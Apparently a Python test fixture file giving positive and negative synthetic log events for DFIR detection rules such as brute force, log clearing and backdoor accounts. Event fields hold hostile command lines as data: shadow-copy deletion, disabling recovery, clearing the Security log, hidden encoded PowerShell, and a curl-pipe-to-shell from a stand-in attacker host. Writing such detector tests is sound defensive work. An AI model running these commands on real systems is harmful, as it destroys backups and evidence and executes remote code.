"""Positive and negative fixture events for every built-in rule (guide 11.3 item 6).

``FIXTURES[rule_id] = {"positive": [events], "negative": [events]}`` for timestamp-ordered rules;
source-detector rules also give ``"source"`` (``SourceInfo`` fields) and events in record order
(``recno``). Each list is one scenario: the positive one must produce an alert for the rule, the
negative one must not (negatives are near misses: same shape, one condition broken).
"""

from __future__ import annotations

import uuid
from datetime import UTC, datetime, timedelta
from typing import Any

T0 = datetime(2026, 3, 1, 10, 0, 0, tzinfo=UTC)
_NS = uuid.UUID("7c7b8e44-3f55-4a8e-9a5e-2e3a4b8b9c01")


def ev(minutes: float, key: str = "", **fields: Any) -> dict[str, Any]:
    ts = T0 + timedelta(minutes=minutes)
    event_id = uuid.uuid5(_NS, f"{key}|{minutes}|{sorted(fields.items())!r}")
    base: dict[str, Any] = {"id": event_id, "ts": ts, "host": "ws01", "source_type": "evtx"}
    base.update(fields)
    return base


def sec(code: str, minutes: float = 0, **fields: Any) -> dict[str, Any]:
    raw = fields.pop("raw", {})
    raw.setdefault("system", {}).setdefault("channel", "Security")
    return ev(minutes, event_code=code, raw=raw, **fields)


def auth(code: str, minutes: float = 0, **fields: Any) -> dict[str, Any]:
    return ev(minutes, event_code=code, source_type="auth_log", host="web01", **fields)


def fails(
    code: str, n: int, ip: str, *, step: float = 0.2, start: float = 0, **kw: Any
) -> list[dict[str, Any]]:
    maker = auth if code.startswith("ssh") else sec
    return [maker(code, start + i * step, src_ip=ip, **kw) for i in range(n)]


def spray(ip: str, users: int, *, same_user: bool = False) -> list[dict[str, Any]]:
    return [
        sec("4625", i * 2, src_ip=ip, user="CORP\\alice" if same_user else f"CORP\\user{i}")
        for i in range(users)
    ]


def rec(recno: int, minutes: float, **fields: Any) -> dict[str, Any]:
    return ev(minutes, key=str(recno), recno=recno, **fields)


FIXTURES: dict[str, dict[str, Any]] = {
    "DFIR-WIN-0001": {
        "positive": [sec("1102", user="CORP\\mallory")],
        "negative": [sec("1102", raw={"system": {"channel": "System"}}), sec("4624")],
    },
    "DFIR-WIN-0002": {
        "positive": [
            ev(
                0,
                event_code="104",
                raw={"system": {"channel": "System", "provider": "Microsoft-Windows-Eventlog"}},
            )
        ],
        "negative": [
            ev(
                0,
                event_code="104",
                raw={"system": {"channel": "System", "provider": "Some-Other-Provider"}},
            )
        ],
    },
    "DFIR-WIN-0003": {
        "positive": fails("4625", 10, "203.0.113.9", step=0.4),
        "negative": fails("4625", 10, "203.0.113.9", step=0.6)  # 10 events span 5.4 min
        + fails("4625", 9, "203.0.113.10", step=0.1, start=20),
    },
    "DFIR-WIN-0004": {
        "positive": [*fails("4625", 5, "198.51.100.4"), sec("4624", 3, src_ip="198.51.100.4")],
        "negative": [
            *fails("4625", 5, "198.51.100.4"),
            sec("4624", 3, src_ip="198.51.100.5"),
            sec("4624", 30, src_ip="198.51.100.4"),
        ],
    },
    "DFIR-WIN-0005": {
        "positive": spray("192.0.2.77", 5),
        "negative": spray("192.0.2.77", 8, same_user=True) + spray("192.0.2.78", 4),
    },
    "DFIR-WIN-0006": {
        "positive": [
            ev(
                0,
                event_code="7045",
                file_path="C:\\Users\\bob\\AppData\\Local\\Temp\\svc.exe",
                raw={"system": {"channel": "System", "provider": "Service Control Manager"}},
            )
        ],
        "negative": [
            ev(
                0,
                event_code="7045",
                file_path="C:\\Windows\\System32\\svchost.exe",
                raw={"system": {"channel": "System"}},
            ),
            ev(1, event_code="4688", file_path="C:\\Users\\bob\\AppData\\Local\\Temp\\x.exe"),
        ],
    },
    "DFIR-WIN-0007": {
        "positive": [sec("4698", message="Scheduled task created: \\Updater")],
        "negative": [sec("4699"), ev(1, event_code="106", raw={"system": {"provider": "Other"}})],
    },
    "DFIR-WIN-0008": {
        "positive": [sec("4720", user="CORP\\admin")],
        "negative": [sec("4726"), ev(1, event_code="4720", source_type="auth_log")],
    },
    "DFIR-WIN-0009": {
        "positive": [sec("4732", raw={"normalized": {"group": "Builtin\\Administrators"}})],
        "negative": [
            sec("4732", raw={"normalized": {"group": "Builtin\\Users"}}),
            sec("4733", 1, raw={"normalized": {"group": "Builtin\\Administrators"}}),
            sec("4732", 2, raw={"normalized": {"group": "CORP\\NotAdministrators2"}}),
        ],
    },
    "DFIR-WIN-0010": {
        "positive": [ev(0, event_code="4688", cmdline="vssadmin.exe Delete Shadows /All /Quiet")],
        "negative": [ev(0, event_code="4688", cmdline="vssadmin.exe list shadows")],
    },
    "DFIR-WIN-0011": {
        "positive": [ev(0, cmdline="bcdedit /set {default} recoveryenabled No")],
        "negative": [
            ev(0, cmdline="bcdedit /set {default} recoveryenabled Yes"),
            ev(1, cmdline="notbcd recoveryenabled no"),
        ],
    },
    "DFIR-WIN-0012": {
        "positive": [
            ev(0, cmdline="powershell.exe -NoP -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBi")
        ],
        "negative": [
            ev(0, cmdline="powershell.exe -ExecutionPolicy Bypass -File C:\\scripts\\ok.ps1"),
            ev(1, cmdline="powershell.exe -enc short"),
        ],
    },
    "DFIR-WIN-0026": {
        "positive": [sec("4616")],
        "negative": [sec("4616", raw={"system": {"channel": "Application"}}), sec("4624", 1)],
    },
    "DFIR-WIN-0029": {
        "positive": [sec("4719", user="CORP\\mallory")],
        "negative": [sec("4720"), ev(1, event_code="4719", source_type="syslog")],
    },
    "DFIR-WIN-0030": {
        "positive": [ev(0, cmdline='wevtutil.exe cl "Security"')],
        "negative": [
            ev(0, cmdline="wevtutil.exe qe Security /c:5"),
            ev(1, cmdline="clean-logs.bat"),
        ],
    },
    "DFIR-LNX-0001": {
        "positive": fails("ssh_failed", 10, "203.0.113.50", step=0.1),
        "negative": fails("ssh_failed", 9, "203.0.113.50", step=0.1)
        + fails("ssh_accepted", 10, "203.0.113.51", step=0.1),
    },
    "DFIR-LNX-0002": {
        "positive": [
            *fails("ssh_failed", 6, "203.0.113.60"),
            auth("ssh_accepted", 10, src_ip="203.0.113.60", user="alice"),
        ],
        "negative": [
            *fails("ssh_failed", 4, "203.0.113.60"),
            auth("ssh_accepted", 10, src_ip="203.0.113.60", user="alice"),
        ],
    },
    "DFIR-LNX-0003": {
        "positive": [auth("ssh_accepted", user="root", src_ip="203.0.113.7")],
        "negative": [auth("ssh_accepted", user="alice"), auth("ssh_failed", 1, user="root")],
    },
    "DFIR-LNX-0004": {
        "positive": [auth("user_created", user="backdoor")],
        "negative": [auth("user_deleted", user="backdoor")],
    },
    "DFIR-LNX-0011": {
        "positive": [auth("group_member_added", user="backdoor", raw={"auth": {"group": "sudo"}})],
        "negative": [auth("group_member_added", user="bob", raw={"auth": {"group": "developers"}})],
    },
    "DFIR-WIN-0027": {
        "source": {"evidence_id": "ev-1", "source_file": "Security.evtx"},
        "positive": [rec(100, 0), rec(101, 1), rec(105, 2), rec(106, 3)],
        "negative": [rec(100, 0), rec(101, 1), rec(101, 1.5), rec(102, 2)],
    },
    "DFIR-AF-0001": {
        "source": {"evidence_id": "ev-2", "source_file": "auth.log"},
        "positive": [
            rec(1, 60, source_type="auth_log"),
            rec(2, 61, source_type="auth_log"),
            rec(3, 20, source_type="auth_log"),
        ],
        "negative": [
            rec(1, 60, source_type="auth_log"),
            rec(2, 58, source_type="auth_log"),
            rec(3, 62, source_type="auth_log"),
        ],
    },
    "DFIR-AF-0002": {
        "source": {"evidence_id": "ev-3", "source_file": "auth.log"},
        "positive": [rec(i, i, source_type="auth_log") for i in range(1, 12)]
        + [rec(12, 11 + 20 * 60, source_type="auth_log")],
        "negative": [rec(i, i * 90, source_type="auth_log") for i in range(1, 13)],
    },
    "DFIR-AF-0003": {
        "source": {
            "evidence_id": "ev-4",
            "source_file": "auth.log",
            "acquired_at": T0 + timedelta(days=3),
        },
        "positive": [rec(1, 0, source_type="auth_log"), rec(2, 5, source_type="auth_log")],
        "negative": [rec(1, 0, source_type="auth_log"), rec(2, 60 * 60, source_type="auth_log")],
    },
    "DFIR-IOC-0001": {
        "iocs": [
            ("ip", "203.0.113.66"),
            ("domain", "evil.example"),
            ("sha256", "a" * 64),
        ],
        "positive": [
            ev(0, src_ip="203.0.113.66"),
            ev(1, cmdline="curl http://cdn.evil.example/x.sh | sh"),
            ev(2, file_hash="sha256:" + "a" * 64),
        ],
        "negative": [
            ev(0, src_ip="203.0.113.67"),
            ev(1, cmdline="curl http://notevil.example/x.sh"),
            ev(2, file_hash="sha256:" + "b" * 64),
        ],
    },
}
